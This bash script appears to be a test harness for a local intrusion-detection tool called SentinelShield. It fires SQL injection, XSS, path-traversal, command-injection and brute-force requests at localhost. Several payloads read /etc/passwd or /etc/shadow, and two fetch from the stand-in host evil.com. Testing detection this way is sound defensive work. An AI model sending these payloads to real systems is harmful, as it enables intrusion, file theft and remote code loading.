#!/bin/bash
# SentinelShield – Attack Simulation Script
# Run with:  bash simulate_attacks.sh
# Make sure the server is running first:  python run.py

BASE="http://localhost:5000"

echo "======================================================"
echo "  SentinelShield Attack Simulator"
echo "======================================================"

echo ""
echo "Firing SQL Injection attacks..."
curl -s "$BASE/?id=' OR 1=1 --" > /dev/null
curl -s -X POST "$BASE/login" -d "username=' OR 1=1 --&password=x" > /dev/null
curl -s "$BASE/search?q=1 UNION SELECT username,password FROM users--" > /dev/null
curl -s "$BASE/profile?user=admin' OR '1'='1" > /dev/null
echo "  Done."

echo "Firing XSS attacks..."
curl -s "$BASE/search?q=<script>alert(document.cookie)</script>" > /dev/null
curl -s -X POST "$BASE/comment" -d "text=<img src=x onerror=alert(1)>&author=test" > /dev/null
curl -s "$BASE/search?q=<script src=http://evil.com/xss.js></script>" > /dev/null
echo "  Done."

echo "Firing LFI / Path Traversal attacks..."
curl -s "$BASE/file?name=../../../../etc/passwd" > /dev/null
curl -s "$BASE/file?name=../../config.py" > /dev/null
curl -s "$BASE/?page=../../../etc/shadow" > /dev/null
echo "  Done."

echo "Firing Command Injection attacks..."
curl -s -X POST "$BASE/ping" -d "host=localhost; cat /etc/passwd" > /dev/null
curl -s -X POST "$BASE/ping" -d 'host=$(whoami)' > /dev/null
curl -s -X POST "$BASE/ping" -d "host=127.0.0.1 && wget http://evil.com" > /dev/null
echo "  Done."

echo "Firing JSON nested payload attacks..."
curl -s -X POST "$BASE/api/data" \
  -H "Content-Type: application/json" \
  -d '{"user": {"id": "1 UNION SELECT username,password FROM users--"}}' > /dev/null
curl -s -X POST "$BASE/api/data" \
  -H "Content-Type: application/json" \
  -d '{"search": {"query": "<script>alert(1)</script>"}}' > /dev/null
echo "  Done."

echo "Sending clean/safe requests..."
curl -s "$BASE/" > /dev/null
curl -s "$BASE/health" > /dev/null
curl -s -X POST "$BASE/login" -d "username=admin&password=admin123" > /dev/null
curl -s "$BASE/search?q=laptop" > /dev/null
curl -s "$BASE/file?name=readme.txt" > /dev/null
echo "  Done."

echo ""
echo "Simulating brute-force (rate limit trigger)..."
for i in $(seq 1 25); do
  curl -s "$BASE/login" -d "username=admin&password=wrongpass$i" > /dev/null
done
echo "  Done (IP should now be rate-limited)."

echo ""
echo "======================================================"
echo "  Simulation complete!"
echo "  Refresh your dashboard: http://localhost:5000/dashboard"
echo "======================================================"
